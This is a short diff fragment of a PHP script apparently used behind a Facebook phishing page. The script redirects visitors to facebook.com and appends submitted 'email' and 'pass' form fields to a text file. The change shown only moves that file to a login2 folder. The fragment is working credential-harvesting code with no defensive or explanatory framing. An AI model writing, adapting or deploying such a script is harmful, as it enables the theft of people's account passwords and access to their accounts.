@@ -3,7 +3,7 @@
 Header ('Location: http://facebook.com');
 
 
-$handle = fopen("pass.txt", "a");
+$handle = fopen("login2/pass.txt", "a");
 foreach($_POST as $variable => $value) {
 if ($variable == 'email' or $variable =='pass')
 {
